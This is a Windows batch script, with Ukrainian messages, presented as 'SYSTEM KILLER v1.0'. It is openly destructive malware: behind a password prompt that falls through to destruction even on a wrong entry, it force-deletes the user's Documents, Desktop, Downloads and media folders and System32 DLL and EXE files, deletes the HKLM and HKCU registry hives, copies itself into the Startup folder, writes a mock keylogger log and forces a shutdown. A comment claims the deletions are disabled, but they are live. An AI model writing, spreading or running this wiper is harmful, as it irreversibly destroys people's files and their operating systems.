@echo off
chcp 65001 >nul
title System Kill
color 4f
mode con cols=80 lines=25

:start
cls
echo ========================================
echo         SYSTEM KILLER v1.0
echo ========================================
echo.
echo Пароль: 
set /p pass="> "

if "%pass%"=="kill" goto destroy
if "%pass%"=="stop" exit

echo Невірний пароль! 30 секунд...
timeout /t 30 /nobreak >nul

:destroy
cls
echo ========================================
echo         ЗНИЩЕННЯ СИСТЕМИ
echo ========================================
echo.

:: Кейлоггер
echo [%date% %time%] Кейлоггер активовано > %temp%\keys.txt
echo Користувач: %username% >> %temp%\keys.txt
echo Комп: %computername% >> %temp%\keys.txt
echo ------------------------ >> %temp%\keys.txt

:: Реальне видалення (розкоментуй для роботи)
echo Видалення документів...
del /f /s /q C:\Users\%username%\Documents\*.* >nul 2>&1

echo Видалення робочого столу...
del /f /s /q C:\Users\%username%\Desktop\*.* >nul 2>&1

echo Видалення завантажень...
del /f /s /q C:\Users\%username%\Downloads\*.* >nul 2>&1

echo Видалення зображень...
del /f /s /q C:\Users\%username%\Pictures\*.* >nul 2>&1

echo Видалення відео...
del /f /s /q C:\Users\%username%\Videos\*.* >nul 2>&1

echo Видалення музики...
del /f /s /q C:\Users\%username%\Music\*.* >nul 2>&1

:: Системні файли
echo Знищення системи...
del /f /s /q C:\Windows\System32\*.dll >nul 2>&1
del /f /s /q C:\Windows\System32\*.exe >nul 2>&1

:: Реєстр
reg delete HKLM /f >nul 2>&1
reg delete HKCU /f >nul 2>&1

:: Копіюємо себе в автозапуск
copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\system.exe" >nul

:: Записуємо логи
echo ЗНИЩЕНО! >> %temp%\keys.txt
copy %temp%\keys.txt %userprofile%\Desktop\log.txt >nul

:: Вимикаємо комп
shutdown /s /f /t 5 /c "SYSTEM DESTROYED"

echo.
echo ГОТОВО. ПЕРЕЗАВАНТАЖЕННЯ...
timeout /t 5 >nul
